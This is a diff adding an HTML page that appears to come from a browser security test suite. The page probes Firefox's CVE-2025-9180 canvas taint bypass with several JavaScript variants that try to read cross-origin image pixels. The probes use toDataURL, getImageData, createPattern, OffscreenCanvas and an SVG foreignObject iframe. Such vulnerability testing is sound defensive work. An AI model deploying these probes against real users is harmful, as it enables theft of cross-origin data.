@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>UXSS-FIREFOX-01: Canvas2D Same-Origin Policy Bypass</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>Canvas2D Same-Origin Policy Bypass</h1>
+    <div class="meta">
+        <span>ID: UXSS-FIREFOX-01</span>
+        <span>CVE: CVE-2025-9180</span>
+        <span>Browsers: Firefox (pre-142), Thunderbird</span>
+        <span>Category: SOP Bypass / Cross-Origin Data Exfiltration</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p>CVE-2025-9180 is a same-origin policy bypass in Firefox's Graphics Canvas2D component.
+        It allows malicious websites to access cross-origin image data through the canvas,
+        bypassing the "tainted canvas" security mechanism that normally prevents reading
+        pixel data from cross-origin images.</p>
+        <p>Discovered by Tom Van Goethem. Fixed in Firefox 142.</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Technique</h2>
+        <div class="code-block">// Normal behavior: drawing a cross-origin image taints the canvas,
+// preventing toDataURL() and getImageData() from reading pixels.
+//
+// The vulnerability allows bypassing this taint check through
+// specific canvas operations or timing.
+
+const canvas = document.createElement('canvas');
+const ctx = canvas.getContext('2d');
+const img = new Image();
+img.crossOrigin = ''; // Try various CORS settings
+img.src = 'https://ebniw.com/secret-image.png';
+img.onload = () => {
+    ctx.drawImage(img, 0, 0);
+    try {
+        // Should throw SecurityError on tainted canvas
+        const data = canvas.toDataURL();
+        // If we get here without error, canvas taint was bypassed!
+    } catch(e) {
+        // Expected: "The operation is insecure"
+    }
+};</div>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test</h2>
+        <button class="btn btn-run" onclick="runTest()">Test Canvas Taint Bypass</button>
+        <button class="btn" onclick="runVariantGetImageData()">Variant: getImageData()</button>
+        <button class="btn" onclick="runVariantCreatePattern()">Variant: createPattern()</button>
+        <button class="btn" onclick="runVariantOffscreen()">Variant: OffscreenCanvas</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runTest() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Running Canvas2D taint bypass test...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + ' (' + info.engine + ')</div>';
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 200;
+    canvas.height = 200;
+    const ctx = canvas.getContext('2d');
+
+    // Draw something local first
+    ctx.fillStyle = 'blue';
+    ctx.fillRect(0, 0, 200, 200);
+
+    // Verify untainted canvas works
+    try {
+        const localData = canvas.toDataURL();
+        output.innerHTML += '<div style="color:#3fb950;">Untainted canvas toDataURL() works (expected).</div>';
+    } catch(e) {
+        output.innerHTML += '<div style="color:#f85149;">Even untainted canvas failed: ' + e.message + '</div>';
+        return;
+    }
+
+    // Now load cross-origin image
+    const img = new Image();
+    // Do NOT set crossOrigin to trigger taint without CORS headers
+    img.src = CONFIG.XORIGIN_ORIGIN + '/favicon.ico?t=' + Date.now();
+
+    img.onload = function() {
+        output.innerHTML += '<div style="color:#8b949e;">Cross-origin image loaded.</div>';
+        ctx.drawImage(img, 0, 0);
+
+        // Test 1: toDataURL on tainted canvas
+        try {
+            const data = canvas.toDataURL();
+            output.innerHTML += '<div style="color:#f85149;font-weight:bold;">VULNERABLE: toDataURL() succeeded on tainted canvas!</div>';
+            output.innerHTML += '<div style="color:#f85149;">Data length: ' + data.length + '</div>';
+            reportResult('output', 'Canvas taint bypass (toDataURL)', true,
+                'Cross-origin image data was readable! Data length: ' + data.length);
+        } catch(e) {
+            output.innerHTML += '<div style="color:#3fb950;">toDataURL() blocked on tainted canvas (expected): ' + e.message + '</div>';
+            reportResult('output', 'Canvas taint bypass (toDataURL)', false, e.message);
+        }
+
+        // Test 2: toBlob on tainted canvas
+        try {
+            canvas.toBlob(function(blob) {
+                if (blob) {
+                    output.innerHTML += '<div style="color:#f85149;font-weight:bold;">VULNERABLE: toBlob() succeeded on tainted canvas!</div>';
+                    reportResult('output', 'Canvas taint bypass (toBlob)', true, 'Blob size: ' + blob.size);
+                }
+            });
+        } catch(e) {
+            output.innerHTML += '<div style="color:#3fb950;">toBlob() blocked (expected): ' + e.message + '</div>';
+        }
+    };
+
+    img.onerror = function() {
+        output.innerHTML += '<div style="color:#8b949e;">Cross-origin image failed to load. Testing with data URI fallback...</div>';
+        // Use a known cross-origin resource as fallback
+        testWithSvgForeignObject();
+    };
+}
+
+function testWithSvgForeignObject() {
+    const output = document.getElementById('output');
+    const canvas = document.createElement('canvas');
+    canvas.width = 200;
+    canvas.height = 200;
+    const ctx = canvas.getContext('2d');
+
+    // SVG with foreignObject can embed HTML - tests if this taints canvas
+    const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
+        '<foreignObject width="200" height="200">' +
+        '<body xmlns="http://www.w3.org/1999/xhtml">' +
+        '<iframe src="' + CONFIG.XORIGIN_ORIGIN + '" style="width:200px;height:200px;"></iframe>' +
+        '</body></foreignObject></svg>';
+
+    const blob = new Blob([svg], { type: 'image/svg+xml' });
+    const url = URL.createObjectURL(blob);
+    const img = new Image();
+    img.onload = function() {
+        ctx.drawImage(img, 0, 0);
+        try {
+            const data = canvas.toDataURL();
+            reportResult('output', 'SVG foreignObject canvas taint', true,
+                'Canvas with embedded cross-origin content was readable!');
+        } catch(e) {
+            reportResult('output', 'SVG foreignObject canvas taint', false,
+                'Properly tainted: ' + e.message);
+        }
+        URL.revokeObjectURL(url);
+    };
+    img.src = url;
+}
+
+function runVariantGetImageData() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Testing getImageData on tainted canvas...</div>';
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 100;
+    canvas.height = 100;
+    const ctx = canvas.getContext('2d');
+
+    const img = new Image();
+    img.src = CONFIG.XORIGIN_ORIGIN + '/favicon.ico?t=' + Date.now();
+    img.onload = function() {
+        ctx.drawImage(img, 0, 0);
+        try {
+            const imageData = ctx.getImageData(0, 0, 100, 100);
+            reportResult('output', 'getImageData on tainted canvas', true,
+                'Pixel data accessible! First pixel RGBA: ' +
+                imageData.data[0] + ',' + imageData.data[1] + ',' +
+                imageData.data[2] + ',' + imageData.data[3]);
+        } catch(e) {
+            reportResult('output', 'getImageData on tainted canvas', false,
+                'Blocked: ' + e.message);
+        }
+    };
+    img.onerror = function() {
+        output.innerHTML += '<div style="color:#8b949e;">Image failed to load. Ensure ' + CONFIG.XORIGIN_DOMAIN + ' is accessible.</div>';
+    };
+}
+
+function runVariantCreatePattern() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Testing createPattern leak...</div>';
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 100;
+    canvas.height = 100;
+    const ctx = canvas.getContext('2d');
+
+    const img = new Image();
+    img.src = CONFIG.XORIGIN_ORIGIN + '/favicon.ico?t=' + Date.now();
+    img.onload = function() {
+        try {
+            const pattern = ctx.createPattern(img, 'repeat');
+            ctx.fillStyle = pattern;
+            ctx.fillRect(0, 0, 100, 100);
+            // Now try to read
+            const data = canvas.toDataURL();
+            reportResult('output', 'createPattern taint bypass', true,
+                'Pattern from cross-origin image was readable!');
+        } catch(e) {
+            reportResult('output', 'createPattern taint bypass', false,
+                'Blocked: ' + e.message);
+        }
+    };
+    img.onerror = function() {
+        output.innerHTML += '<div style="color:#8b949e;">Image failed to load.</div>';
+    };
+}
+
+function runVariantOffscreen() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Testing OffscreenCanvas variant...</div>';
+
+    if (typeof OffscreenCanvas === 'undefined') {
+        output.innerHTML += '<div style="color:#8b949e;">OffscreenCanvas not supported.</div>';
+        return;
+    }
+
+    const offscreen = new OffscreenCanvas(100, 100);
+    const ctx = offscreen.getContext('2d');
+
+    const img = new Image();
+    img.src = CONFIG.XORIGIN_ORIGIN + '/favicon.ico?t=' + Date.now();
+    img.onload = function() {
+        try {
+            ctx.drawImage(img, 0, 0);
+            const blob = offscreen.convertToBlob();
+            blob.then(function(b) {
+                reportResult('output', 'OffscreenCanvas taint bypass', true,
+                    'convertToBlob succeeded on tainted OffscreenCanvas! Size: ' + b.size);
+            }).catch(function(e) {
+                reportResult('output', 'OffscreenCanvas taint bypass', false, 'Blocked: ' + e.message);
+            });
+        } catch(e) {
+            reportResult('output', 'OffscreenCanvas taint bypass', false, 'Blocked: ' + e.message);
+        }
+    };
+    img.onerror = function() {
+        output.innerHTML += '<div style="color:#8b949e;">Image failed to load.</div>';
+    };
+}
+</script>
+</body>
+</html>
